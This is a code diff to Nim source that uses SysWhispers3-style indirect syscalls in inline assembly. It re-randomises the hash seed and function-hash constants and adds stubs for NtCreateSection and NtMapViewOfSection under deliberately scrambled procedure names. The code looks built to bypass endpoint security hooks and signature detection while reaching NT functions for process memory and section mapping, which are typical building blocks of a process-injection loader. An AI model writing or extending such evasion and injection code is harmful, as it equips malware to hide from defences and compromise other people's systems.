@@ -33,7 +33,7 @@ type
 
 #include <windows.h>
 
-#define SW3_SEED 0xFFF3C187
+#define SW3_SEED 0x2F73C6EA
 #define SW3_ROL8(v) (v << 8 | v >> 24)
 #define SW3_ROR8(v) (v >> 8 | v << 24)
 #define SW3_ROX8(v) ((SW3_SEED % 2) ? SW3_ROL8(v) : SW3_ROR8(v))
@@ -375,7 +375,7 @@ proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T,
 	sub rsp, 0x28
 	nop
     nop
-    mov ecx, 0x005A90F1B
+    mov ecx, 0x0CB43FFFF
 	nop
     nop
     call SW3_GetRandomSyscallAddress        
@@ -384,7 +384,7 @@ proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T,
     nop
     nop
     nop
-    mov ecx, 0x005A90F1B
+    mov ecx, 0x0CB43FFFF
 	nop
     nop
     nop
@@ -428,7 +428,7 @@ proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, Numb
     nop
     nop
     nop
-    mov ecx, 0x0262FD121
+    mov ecx, 0x01B88352F
 	nop
     nop
     nop
@@ -439,7 +439,7 @@ proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, Numb
 	mov r15, rax                           
 	nop
     nop
-    mov ecx, 0x0262FD121
+    mov ecx, 0x01B88352F
 	nop
     nop
     nop
@@ -483,7 +483,7 @@ proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
     nop
     mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x082B8C644
+	mov ecx, 0x008304AEA
 	nop
     nop
     nop
@@ -496,7 +496,7 @@ proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
 	mov r15, rax                           
 	nop
     nop
-    mov ecx, 0x082B8C644
+    mov ecx, 0x008304AEA
 	nop
     nop
     call SW3_GetSyscallNumber              
@@ -528,7 +528,7 @@ proc zuatzuastdiasyy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     nop
     nop
     sub rsp, 0x28
-	mov ecx, 0x002A2130F
+	mov ecx, 0x0CA163C5F
 	nop
     nop
     nop
@@ -539,7 +539,7 @@ proc zuatzuastdiasyy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
 	nop
     nop
     mov r15, rax                           
-	mov ecx, 0x002A2130F
+	mov ecx, 0x0CA163C5F
 	nop
     nop
     nop
@@ -579,7 +579,7 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
 	nop
     nop
     sub rsp, 0x28
-	mov ecx, 0x0C89CFC21
+	mov ecx, 0x01D956B1B
 	nop
     nop
     nop
@@ -590,7 +590,7 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
     nop
     nop
     mov r15, rax                           
-	mov ecx, 0x0C89CFC21
+	mov ecx, 0x01D956B1B
 	nop
     nop
     nop
@@ -636,14 +636,14 @@ proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
     nop
     nop
     nop
-    mov ecx, 0x0C5BCDC30
+    mov ecx, 0x08917A68C
 	nop
     nop
     call SW3_GetRandomSyscallAddress        
 	nop
     nop
     mov r15, rax                           
-	mov ecx, 0x0C5BCDC30
+	mov ecx, 0x08917A68C
 	nop
     nop
     nop
@@ -669,6 +669,51 @@ proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
 	nop
     nop
     mov r10, rcx
+	jmp r15                                
+    """
+
+
+
+# NtCreateSection
+proc iuhqdihasduiahsdaksdhak*(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+	mov [rsp +8], rcx          
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 0x28
+	mov ecx, 0x08D17AF86
+	call SW3_GetRandomSyscallAddress        
+	mov r15, rax                           
+	mov ecx, 0x08D17AF86
+	call SW3_GetSyscallNumber              
+	add rsp, 0x28
+	mov rcx, [rsp+8]                      
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	jmp r15                                
+    """
+# NtMapViewOfSection
+proc uihzasdbnqlpoasdlykxc*(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+	mov [rsp +8], rcx          
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 0x28
+	mov ecx, 0x068A01BAD
+	call SW3_GetRandomSyscallAddress        
+	mov r15, rax                           
+	mov ecx, 0x068A01BAD
+	call SW3_GetSyscallNumber              
+	add rsp, 0x28
+	mov rcx, [rsp+8]                      
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
 	jmp r15                                
     """
 
